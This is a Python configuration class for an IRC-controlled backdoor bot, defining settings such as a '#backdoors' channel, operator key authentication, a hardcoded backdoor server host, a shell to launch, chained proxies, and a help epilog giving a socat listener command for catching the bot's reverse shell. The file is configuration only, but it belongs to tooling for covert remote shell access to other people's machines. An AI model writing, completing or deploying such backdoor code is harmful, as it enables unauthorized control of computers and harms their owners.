from comboparse import ComboParser
import sys

class Config(ComboParser):
	def die(self, msg):
		sys.stderr.write(msg + '\n')
		sys.exit(1)
	def load(self):
		super(Config, self).load()
		self.irc = None
		self.bot_pk = None
		self.bot_sk = None
		self.auth_request = None
		if self.proxies:
			self.proxies = [ str(i).strip() for i in self.proxies.split(',') ]
		if not self.args.genkey and not self.args.challenge:
			if not self.opmask and not self.opkey: self.die("error: either opmask or opkey need to be provided")
		elif self.args.challenge and not self.privkey:
			self.die("error: --challenge requires --privkey")
		elif self.args.challenge and not self.opkey:
			self.die("error: --challenge requires --opkey")
	def __init__(self):
		super(Config, self).__init__('config.ini')
		section = "DEFAULT"
		# add_item(self, section, name, type, default, desc, required)
		self.add_item(section, 'proxies', str, None, 'comma-separated list of proxies (will be chained if count>1)', False)
		self.add_item(section, 'host', str, 'irc.efnet.org', 'hostname/ip of irc server', True)
		self.add_item(section, 'port', int, 6667, 'port of irc server', True)
		self.add_item(section, 'ssl', bool, False, 'irc server uses ssl', False)
		self.add_item(section, 'botnick', str, 'i_am_a_bot', 'nickname for bot', True)
		self.add_item(section, 'channel', str, '#backdoors', 'channel for bot to connect', True)
		self.add_item(section, 'opmask', str, None, 'mask of operator. either this or opkey need to be used', False)
		self.add_item(section, 'opkey', str, None, 'hex-encoded public key of operator', False)
		self.add_item(section, 'backdoorserver', str, None, 'hardcoded hostname of backdoor server', False)
		self.add_item(section, 'shell', str, '/bin/sh', 'name of shell to launch', False)
		self.add_item(section, 'debug', bool, False, 'display debug information (in IRC channel)', False)
		self.add_item(section, 'quiet', bool, False, 'don\'t print IRC traffic to stdout', False)
		self.add_item(section, 'quietpriv', bool, False, 'don\'t print IRC PRIVMSG traffic', False)
		self.add_item(section, 'privkey', str, None, 'hex-encoded secret key of operator (only needed for --challenge, don\'t put this into your bot config!)', False)

		self.aparser.add_argument("--genkey", help="*** generate and print a keypair for use in opkey", required=False, action="store_true", default=False)
		self.aparser.add_argument("--challenge", help="*** generate and print challenge response for an auth request (requires --privkey", required=False, type=str, default=None)
		self.aparser.epilog = 'options marked with *** are standalone functionality and don\'t start the bot.\n\nbackdoor requires on server side a listening port (best with socat)::::::\n socat file:`tty`,raw,echo=0 tcp-listen:$port'

